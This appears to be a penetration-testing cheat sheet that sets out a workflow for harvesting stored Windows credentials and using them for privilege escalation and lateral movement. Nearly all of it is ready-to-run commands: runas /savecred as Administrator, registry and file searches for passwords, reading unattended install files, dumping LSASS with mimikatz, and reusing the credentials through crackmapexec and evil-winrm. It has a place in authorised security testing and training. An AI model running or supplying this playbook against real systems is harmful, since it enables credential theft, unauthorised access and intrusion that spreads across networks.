# Windows Privilege Escalation – Stored Credentials

## Purpose

This file provides a structured workflow for identifying and exploiting stored credentials for privilege escalation and lateral movement.

Core rules:
- Credentials are often reused
- Stored credentials can provide immediate access
- No exploit required—just discovery and reuse
- Always test credentials everywhere

---

## 0. Mental Model

Credentials are often stored:
- in memory
- in registry
- in files
- in Windows credential manager

If you find them:
→ you can reuse them

---

## 1. Check Stored Credentials (CRITICAL FIRST STEP)

cmd:

cmdkey /list

---

## 2. Use Stored Credentials

Example:

runas /savecred /user:Administrator cmd

If credentials stored:
→ opens shell as that user

---

## 3. Check Credential Manager (GUI Alternative)

Control Panel → Credential Manager

Look for:
- Windows Credentials
- Generic Credentials

---

## 4. Dump Credentials from Registry

Check:

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

---

## 5. Search Files for Credentials

cmd:

findstr /S /I password *.txt *.ini *.config *.xml

PowerShell:

Select-String -Path C:\* -Pattern "password" -Recurse -ErrorAction SilentlyContinue

---

## 6. Check Configuration Files

Common locations:

C:\inetpub\
C:\xampp\
C:\Program Files\
C:\Users\

Look for:
- database credentials
- service accounts
- API keys

---

## 7. Check Unattended Install Files

Common files:

C:\Windows\Panther\Unattend.xml  
C:\Windows\Panther\Unattended.xml  
C:\Windows\System32\Sysprep\sysprep.xml  
C:\Windows\System32\Sysprep\unattend.xml  

---

## 8. Extract Credentials from Unattended Files

type C:\Windows\Panther\Unattend.xml

Look for:

<Password>...</Password>

---

## 9. Dump Credentials from LSASS (ADVANCED)

Tools:

mimikatz.exe

Commands:

sekurlsa::logonpasswords

---

## 10. Check Browser Credentials

Paths:

C:\Users\<user>\AppData\Local\Google\Chrome\  
C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\  

---

## 11. Check PowerShell History

type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

---

## 12. Check RDP Credentials

cmdkey /list

Look for:
- saved RDP sessions

---

## 13. Reuse Credentials

Try:

runas /user:<user> cmd

---

## 14. Lateral Movement

crackmapexec smb <IP> -u user -p password
crackmapexec winrm <IP> -u user -p password

---

## 15. Remote Access

evil-winrm -i <IP> -u user -p password

---

## 16. Check Privileges

whoami /groups
whoami /priv

---

## 17. Common Failure Points

- credentials outdated
- wrong domain/user format
- insufficient privileges
- AV blocks credential dumping

---

## 18. If Stuck

- search more files
- check different users
- test credentials on multiple services
- revisit registry and config files

---

## 19. Quick Exploit Pattern

1. list stored credentials
2. search files and registry
3. extract credentials
4. test locally
5. test remotely
6. escalate or pivot

---

## 20. Mental Model

Stored credentials = access  
Access = privilege  
Privilege = control  

---

## 21. Golden Rules

- Always run cmdkey /list early
- Always search config files
- Always check unattended installs
- Always test credentials everywhere
- Reuse is more powerful than exploitation